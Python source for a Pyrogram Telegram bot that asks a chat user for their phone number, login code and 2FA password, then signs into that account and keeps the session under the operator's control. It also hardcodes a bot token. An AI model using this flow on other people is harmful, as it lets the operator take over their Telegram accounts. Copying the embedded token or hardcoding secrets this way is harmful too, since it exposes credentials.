from pyrogram import Client, filters
from pyrogram.errors import SessionPasswordNeeded
from pyrogram.types.messages_and_media import message
from config import Config
from redis import Redis
import asyncio

config = Config()
bot = Client('noti_bot', bot_token='1708936291:AAFnMkJN2R1-7Mazl-tptY8cJsbEpIWJ38w')

class StateManager(Client):
    state = None
    

    def __init__(self, config):
        print('State_manager started')
        self.api_id = config.api_id
        self.api_hash = config.api_hash
        pass

    def start_session(self, phone_number):
        self.app = Client('test', self.api_id, self.api_hash)
        self.app.connect()
        self.phone = phone_number
        self.code_hash = self.app.send_code(self.phone).phone_code_hash
        print('Code_sent')

    def enter_code(self, code):
        print('Waiting for code')
        try:         
            self.app.sign_in(self.phone, self.code_hash, code)
            self.app.disconnect()
            return True
        except SessionPasswordNeeded:
            return False

    def enter_2fa(self, tfa):
        self.app.check_password(tfa)
        self.app.disconnect()

    def make_state(self, state):
        self.state = state


state_m = StateManager(config)
redis = Redis()


@bot.on_message(filters.command('start'), group=3)
def start(client, msg):
    print('start')
    bot.send_message(msg.from_user.id, "Введите номер")
    state_m.make_state('wait_for_phone')


@bot.on_message(group=2)
def wait_code(client, msg):
    if state_m.state == 'wait_for_phone':
        print('wait_code')
        phone_number = msg.text

        state_m.start_session(phone_number)
        bot.send_message(msg.from_user.id, "Номер принят")
        bot.send_message(msg.from_user.id, "Введите код")
        state_m.make_state('wait_for_code')
        bot.send_message(msg.from_user.id, "state = {}".format(state_m.state))

@bot.on_message(group=1)
def wait_2fa(client, msg):
    if state_m.state == 'wait_for_code':
        print('wait_2fa')
        code = msg.text

        if state_m.enter_code(code):
            bot.send_message(msg.from_user.id, "Код принят")
            bot.send_message(msg.from_user.id, "Аккаунт добавлен")
            bot.send_message(msg.from_user.id, "state = {}".format(state_m.state))
        else:
            state_m.make_state('wait_for_2fa')
            bot.send_message(msg.from_user.id, "Код принят")
            bot.send_message(msg.from_user.id, "Введите 2fa")
            bot.send_message(msg.from_user.id, "state = {}".format(state_m.state))
        
@bot.on_message(group=0)
def final(client, msg):
    if state_m.state == 'wait_for_2fa':
        print('final')
        tfa = msg.text

        state_m.enter_2fa(tfa)
        bot.send_message(msg.from_user.id, "Аккаунт добавлен")
        bot.send_message(msg.from_user.id, "state = {}".format(state_m.state))




bot.run()
print('Pyro started')